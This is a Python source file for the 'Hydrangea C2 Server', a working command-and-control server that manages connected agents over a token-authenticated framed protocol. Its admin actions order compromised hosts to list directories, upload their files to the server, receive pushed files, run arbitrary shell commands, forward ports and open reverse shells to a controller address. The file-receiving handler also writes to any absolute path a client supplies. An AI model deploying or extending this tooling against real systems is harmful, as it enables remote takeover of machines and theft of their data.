#!/usr/bin/env python3

import argparse
import asyncio
import logging
import os
import uuid
from typing import Dict, Any
import logging.handlers

__version__ = "2.2"

from utils.common import read_frame, write_frame, ProtocolError, safe_join

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
file_handler = logging.FileHandler("hydrangea_server.log")
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
logging.getLogger().addHandler(file_handler)
log = logging.getLogger("hydrangea.server")


class ClientSession:
    def __init__(self, client_id: str, writer: asyncio.StreamWriter):
        self.client_id = client_id
        self.writer = writer
        self.queue: "asyncio.Queue[dict]" = asyncio.Queue()
        self.alive = True


class Server:
    def __init__(self, host: str, ports: list[int], storage: str, auth_token: str):
        self.host = host
        self.ports = ports
        self.storage = storage
        self.auth_token = auth_token
        os.makedirs(self.storage, exist_ok=True)
        self.clients: Dict[str, ClientSession] = {}
        self.servers: list[asyncio.base_events.Server] = []
        self.pending: Dict[str, asyncio.Future] = {}
        self.log_buffer = logging.handlers.MemoryHandler(
            capacity=100, target=None
        )
        logging.getLogger().addHandler(self.log_buffer)

    async def start(self):
        print
        print(
            f"Starting server on {self.host}:{', '.join(map(str, self.ports))} with storage at {self.storage}"
        )
        for port in self.ports:
            srv = await asyncio.start_server(self.handle_connection, self.host, port)
            self.servers.append(srv)
            sockets = ", ".join(str(s.getsockname()) for s in srv.sockets or [])
            log.info(f"Listening on {sockets}")
        await asyncio.gather(*(srv.serve_forever() for srv in self.servers))

    async def handle_connection(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ):
        peer = writer.get_extra_info("peername")
        try:
            header, payload = await read_frame(reader)
        except Exception as e:
            log.warning(f"{peer} failed to send initial frame: {e}")
            writer.close()
            await writer.wait_closed()
            return

        msg_type = header.get("type")
        token = header.get("token")
        if token != self.auth_token:
            log.warning(f"Auth failed from {peer}")
            await write_frame(writer, {"type": "ERROR", "error": "auth_failed"})
            writer.close()
            await writer.wait_closed()
            return

        if msg_type == "REGISTER":
            await self.handle_client(reader, writer, header)
        elif msg_type == "ADMIN":
            await self.handle_admin(reader, writer, header, payload)
        else:
            await write_frame(
                writer, {"type": "ERROR", "error": "invalid_initial_type"}
            )
            writer.close()
            await writer.wait_closed()

    async def handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        header: Dict[str, Any],
    ):
        client_id = header.get("client_id")
        if not client_id:
            await write_frame(writer, {"type": "ERROR", "error": "missing_client_id"})
            writer.close()
            await writer.wait_closed()
            return

        # Handle test connections separately
        if client_id.startswith("test-connection"):
            await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
            log.info(f"Test connection successful: {client_id}")
            writer.close()
            await writer.wait_closed()
            return
        
        # Replace existing session if duplicate
        if client_id in self.clients:
            try:
                self.clients[client_id].writer.close()
            except Exception:
                pass

        session = ClientSession(client_id, writer)
        self.clients[client_id] = session
        await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
        log.info(f"Client registered: {client_id}")

        # Start a task to pump orders to client
        asyncio.create_task(self._pump_orders(session))

        try:
            while not reader.at_eof():
                header, payload = await read_frame(reader)
                t = header.get("type")
                if t == "PONG":
                    continue

                elif t == "RESULT_LIST_DIR":
                    rid = header.get("req_id")
                    if rid and rid in self.pending:
                        fut = self.pending.pop(rid)
                        if not fut.done():
                            fut.set_result((header, payload))
                    else:
                        log.info(
                            f"[{client_id}] LIST_DIR {header.get('path')} -> "
                            f"{header.get('entries_count', '?')} entries"
                        )

                elif t == "RESULT_EXEC":
                    rid = header.get("req_id")
                    if rid and rid in self.pending:
                        fut = self.pending.pop(rid)
                        if not fut.done():
                            fut.set_result((header, payload))
                    else:
                        log.info(f"[{client_id}] EXEC result rc={header.get('rc')}")

                elif t == "RESULT_SESSION_INFO":
                    rid = header.get("req_id")
                    if rid and rid in self.pending:
                        fut = self.pending.pop(rid)
                        if not fut.done():
                            fut.set_result((header, payload))
                    else:
                        log.info(f"[{client_id}] SESSION_INFO received")

                elif t == "FILE":
                    # Client sent a file in response to PULL_FILE
                    try:
                        rel = header.get("save_as") or os.path.basename(
                            header.get("src_path", "file.bin")
                        )

                        if rel and os.path.isabs(rel):
                            # Absolute save path: respect it (write anywhere on server)
                            dest_path = os.path.realpath(rel)
                            os.makedirs(
                                os.path.dirname(dest_path) or "/", exist_ok=True
                            )
                        else:
                            # Relative: keep it under server_storage/<client_id>/
                            dest_dir = os.path.join(self.storage, client_id)
                            os.makedirs(dest_dir, exist_ok=True)
                            dest_path = safe_join(dest_dir, rel or "file.bin")
                            os.makedirs(
                                os.path.dirname(dest_path) or dest_dir, exist_ok=True
                            )

                        with open(dest_path, "wb") as f:
                            f.write(payload or b"")

                        log.info(
                            f"[{client_id}] Received file -> {dest_path} "
                            f"({len(payload or b'')} bytes, sha256={header.get('sha256')})"
                        )
                        await write_frame(
                            writer, {"type": "ACK", "ack": "FILE", "save_as": rel}
                        )
                    except Exception as e:
                        # Do not drop the client session; just log the error.
                        log.exception(f"[{client_id}] Failed saving incoming FILE: {e}")

                elif t == "LOG":
                    log.info(f"[{client_id}] {header.get('message')}")

                elif t == "REVERSE_SHELL":
                    controller_addr = header.get("controller_addr")
                    if not controller_addr:
                        response = {"type": "ERROR", "message": "Controller address missing"}
                        await write_frame(writer, response, b"")
                        continue

                    response = {"type": "REVERSE_SHELL", "controller_addr": controller_addr}
                    await write_frame(writer, response, b"")

                else:
                    log.debug(f"[{client_id}] Unhandled message type: {t}")
        except (ProtocolError, asyncio.IncompleteReadError) as e:
            log.warning(f"Client {client_id} disconnected: {e}")
        except Exception as e:
            log.exception(f"Error handling client {client_id}: {e}")
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            if self.clients.get(client_id) is session:
                del self.clients[client_id]
            log.info(f"Client {client_id} removed")

    async def _pump_orders(self, session: ClientSession):
        while session.alive:
            try:
                order = await session.queue.get()
                await write_frame(
                    session.writer, order["header"], order.get("payload", b"")
                )
            except Exception as e:
                log.warning(f"Failed to send order to {session.client_id}: {e}")
                break

    def get_health_status(self):
        """Generate the server's health status."""
        log_entries = []
        for record in self.log_buffer.buffer:
            log_entries.append(self.log_buffer.format(record))

        return {
            "status": "running",
            "connected_agents": len(self.clients),
            "recent_logs": log_entries[-10:],  # Last 10 log entries
        }

    async def handle_admin(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        header: Dict[str, Any],
        payload: bytes,
    ):
        action = header.get("action")
        target = header.get("target_id")
        if action not in {
            "list",
            "pull",
            "push",
            "ping",
            "clients",
            "exec",
            "session_info",
            "health_status",
            "reverse_shell",
            "port_forward",
        }:
            await write_frame(
                writer, {"type": "ERROR", "error": "unknown_admin_action"}
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "clients":
            await write_frame(
                writer, {"type": "CLIENTS", "clients": list(self.clients.keys())}
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "ping":
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
            else:
                session = self.clients[target]
                await write_frame(session.writer, {"type": "PING"})
                await write_frame(writer, {"type": "OK"})
            writer.close()
            await writer.wait_closed()
            return

        if action == "health_status":
            health_status = self.get_health_status()
            await write_frame(writer, {"type": "HEALTH_STATUS", **health_status})
            writer.close()
            await writer.wait_closed()
            return

        # actions below need a valid target
        if not target or target not in self.clients:
            await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
            writer.close()
            await writer.wait_closed()
            return

        session = self.clients[target]

        if action == "list":
            path = header.get("path", ".")
            wait = bool(header.get("wait", False))
            timeout = float(header.get("timeout", 10.0))

            if wait:
                req_id = uuid.uuid4().hex
                fut: asyncio.Future = asyncio.get_running_loop().create_future()
                self.pending[req_id] = fut
                order = {"header": {"type": "LIST_DIR", "path": path, "req_id": req_id}}
                await session.queue.put(order)
                try:
                    res_header, res_payload = await asyncio.wait_for(
                        fut, timeout=timeout
                    )
                    await write_frame(writer, res_header, res_payload)
                except asyncio.TimeoutError:
                    await write_frame(
                        writer, {"type": "ERROR", "error": "timeout", "path": path}
                    )
                finally:
                    self.pending.pop(req_id, None)
                writer.close()
                await writer.wait_closed()
                return
            else:
                order = {"header": {"type": "LIST_DIR", "path": path}}
                await session.queue.put(order)
                await write_frame(
                    writer, {"type": "QUEUED", "order": "list", "path": path}
                )
                writer.close()
                await writer.wait_closed()
                return

        if action == "pull":
            # Ask client to send us a file
            src = header.get("src")
            save_as = header.get("dest") or os.path.basename(src or "")
            if not src:
                await write_frame(writer, {"type": "ERROR", "error": "missing_src"})
                writer.close()
                await writer.wait_closed()
                return
            order = {
                "header": {"type": "PULL_FILE", "src_path": src, "save_as": save_as}
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {"type": "QUEUED", "order": "pull", "src": src, "save_as": save_as},
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "push":
            # Send a file to client. Payload contains the file bytes.
            dest = header.get("dest")
            src_name = header.get("src_name")
            if dest is None:
                await write_frame(
                    writer, {"type": "ERROR", "error": "missing_dest_or_payload"}
                )
                writer.close()
                await writer.wait_closed()
                return
            order = {
                "header": {
                    "type": "PUSH_FILE",
                    "dest_path": dest,
                    "src_name": src_name or "server_upload.bin",
                },
                "payload": payload or b"",
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {
                    "type": "QUEUED",
                    "order": "push",
                    "dest": dest,
                    "bytes": len(payload or b""),
                },
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "exec":
            cmd = header.get("cmd")
            if not cmd:
                await write_frame(writer, {"type": "ERROR", "error": "missing_cmd"})
                writer.close()
                await writer.wait_closed()
                return
            shell = bool(header.get("shell", False))
            cwd = header.get("cwd")
            timeout = float(header.get("timeout", 30.0))
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            order = {
                "header": {
                    "type": "EXEC",
                    "cmd": cmd,
                    "shell": shell,
                    "cwd": cwd,
                    "req_id": req_id,
                    "timeout": timeout,
                }
            }
            await session.queue.put(order)
            try:
                res_header, res_payload = await asyncio.wait_for(
                    fut, timeout=timeout + 1.0
                )
                await write_frame(writer, res_header, res_payload)
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "session_info":
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            order = {"header": {"type": "SESSION_INFO", "req_id": req_id}}
            await session.queue.put(order)
            try:
                res_header, res_payload = await asyncio.wait_for(
                    fut, timeout=float(header.get("timeout", 5.0))
                )
                await write_frame(writer, res_header, res_payload)
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "port_forward":
            filename = header.get("filename")
            connect_args = header.get("connect_args")
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close(); await writer.wait_closed()
                return
            session = self.clients[target]
            order = {
                "header": {
                    "type": "PORT_FORWARD",
                    "filename": filename,
                    "connect_args": connect_args,
                }
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {"type": "QUEUED", "order": "port_forward", "filename": filename},
            )
            writer.close(); await writer.wait_closed()
            return

        if action == "reverse_shell":
            controller_addr = header.get("controller_addr")
            if not controller_addr:
                await write_frame(writer, {"type": "ERROR", "error": "missing_controller_addr"})
                writer.close(); await writer.wait_closed()
                return
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close(); await writer.wait_closed()
                return
            session = self.clients[target]
            order = {"header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}}
            await session.queue.put(order)
            await write_frame(writer, {"type": "QUEUED", "order": "reverse_shell", "controller_addr": controller_addr})
            writer.close(); await writer.wait_closed()
            return


art = r"""

   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████         ▄████████    ▄████████    ▄████████  ▄█    █▄     ▄████████    ▄████████ 
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███        ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███        ███    █▀    ███    █▀    ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███        ███         ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████      ▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███               ███   ███    █▄  ▀███████████ ███    ███   ███    █▄  ▀███████████ 
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███         ▄█    ███   ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀        ▄████████▀    ██████████   ███    ███  ▀██████▀    ██████████   ███    ███ 
                                      ███    ███                                                                                                ███    ███                           ███    ███ 

              Hydrangea C2 Server
"""


async def amain():
    ap = argparse.ArgumentParser(description="Hydrangea server")
    ap.add_argument("--host", default="0.0.0.0", help="Bind address")
    ap.add_argument(
        "--ports",
        default=["9000"],
        nargs="+",
        type=int,
        help="Ports to listen on (space-separated)",
    )
    ap.add_argument(
        "--storage",
        default="./server_storage",
        help="Directory to store incoming files",
    )
    ap.add_argument("--auth-token", required=True, help="Shared auth token")

    print(art)
    print(f"Version: {__version__}")

    args = ap.parse_args()

    srv = Server(args.host, args.ports, args.storage, args.auth_token)
    try:
        await srv.start()
    except KeyboardInterrupt:
        print("Shutting down...")


if __name__ == "__main__":
    asyncio.run(amain())
